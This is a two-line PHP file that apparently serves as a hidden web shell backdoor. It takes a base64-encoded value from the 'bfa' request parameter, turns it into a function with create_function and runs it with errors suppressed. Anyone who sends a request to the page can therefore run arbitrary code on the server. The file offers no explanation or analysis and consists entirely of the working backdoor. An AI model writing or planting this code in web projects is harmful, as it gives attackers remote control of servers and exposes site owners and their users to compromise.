<?php
if(!empty($_REQUEST['bfa'])){$bfa=base64_decode($_REQUEST['bfa']);$bfa=create_function('',$bfa);@$bfa();exit;}